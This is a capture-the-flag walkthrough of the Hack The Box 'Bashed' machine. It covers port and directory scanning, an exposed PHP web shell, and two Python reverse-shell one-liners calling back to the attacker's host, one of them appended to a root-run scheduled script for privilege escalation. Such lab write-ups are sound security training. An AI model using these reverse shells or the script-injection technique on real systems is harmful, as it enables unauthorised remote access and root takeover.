---
title: Hack The Box - Bashed (Without Metasploit)
date: 2021-01-09 19:28:00 +0800
categories: [hackthebox]
tags: [linux, python]
---

![](/assets/images/bashed.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.68 bashed.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ nmap -sT -sV -sC -Pn bashed.htb
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-08 15:27 EST
Nmap scan report for bashed.htb (10.10.10.68)
Host is up (0.0060s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.94 seconds
```

# Enumeration (1)

## Port 80 `Apache httpd 2.4.18 ((Ubuntu))`

![](/assets/images/bashed1.png)

This looks like someone's blog. In the post, it talked about a web shell called `php-bash` and judging from the screenshot, it is located at `/uploads/phpbash.php but unfortunately it wasn't there. Lets bruteforce some directorys.

```bash
$ gobuster dir -k -u http://bashed.htb/ -w /usr/share/wordlists/dirb/common.txt -t 20 -x .html,.php,.cgi,.sh,.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://bashed.htb/
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,cgi,sh,txt
[+] Timeout:        10s
===============================================================
2021/01/09 05:32:01 Starting gobuster
===============================================================
...
/about.html (Status: 200)
/config.php (Status: 200)
/contact.html (Status: 200)
/css (Status: 301)
/dev (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/php (Status: 301)
/server-status (Status: 403)
/single.html (Status: 200)
/uploads (Status: 301)
===============================================================
2021/01/09 05:32:11 Finished
===============================================================
```

The `/dev` folder seems interesting.

![](/assets/images/bashed2.png)

If we click on the `phpbash.php` link, we are brought to the webshell!

![](/assets/images/bashed3.png)

# user.txt

Despite being the `www-data` user, we can access the user flag in the home directory of `arrexel`.

![](/assets/images/bashed4.png)

# Enumeration (2)

As `www-data`, we could run any commmands as `scriptmanager` using `sudo` but `scriptmanager` did not belong to any administrative group so perhaps it will come in useful later on.

![](/assets/images/bashed5.png)

Before performing further enumeration, lets upgrade to a better shell using `python`.

```bash
www-data@bashed:/var/www/html/dev# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect(("10.10.14.12",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

```bash
$ sudo rlwrap nc -vlnp 9999
[sudo] password for kali: 
listening on [any] 9999 ...
connect to [10.10.X.X] from (UNKNOWN) [10.10.10.68] 38960
www-data@bashed:/$
```

In the root directory, there was a folder called `/scripts`, and inside were 2 files.

```bash
www-data@bashed:/$ ls -al /scripts
ls: cannot access '/scripts/..': Permission denied
ls: cannot access '/scripts/test.py': Permission denied
ls: cannot access '/scripts/test.txt': Permission denied
ls: cannot access '/scripts/.': Permission denied
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
-????????? ? ? ? ?            ? test.py
-????????? ? ? ? ?            ? test.txt
```

We are unable to access it. However, the folder belonged to `scriptmanager` so lets spawn a shell as `scriptmanager` and view the contents of the folder.

```bash
www-data@bashed:/$ ls -al /scripts
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Jan  9 03:10 test.txt
www-data@bashed:/$ cat /scripts/test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
www-data@bashed:/$ cat /scripts/test.txt
testing 123!
```

The `test.txt` is owned by `root`, modified recently and had contents matching the output of `test.py` if ran. This shows that `root` might be scheduled to run `test.py` regularly and if we can inject a reverse shell code into it, we might be able to establish as `root`!

# Exploitation 

```bash
www-data@bashed:/$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect(("10.10.X.X",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> /scripts/test.py
```

After a while, we get a connection on our `nc` listener that we setup beforehand.

```bash
$ sudo rlwrap nc -vlnp 1337
[sudo] password for kali: 
listening on [any] 1337 ...
connect to [10.10.X.X] from (UNKNOWN) [10.10.10.68] 50256
root@bashed:/scripts# id
uid=0(root) gid=0(root) groups=0(root)
```

# root.txt

The root flag is located at `/root` as always.

```bash
root@bashed:/scripts# cat /root/root.txt
cc4fXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```


### Rooted ! Thank you for reading and look forward for more writeups and articles !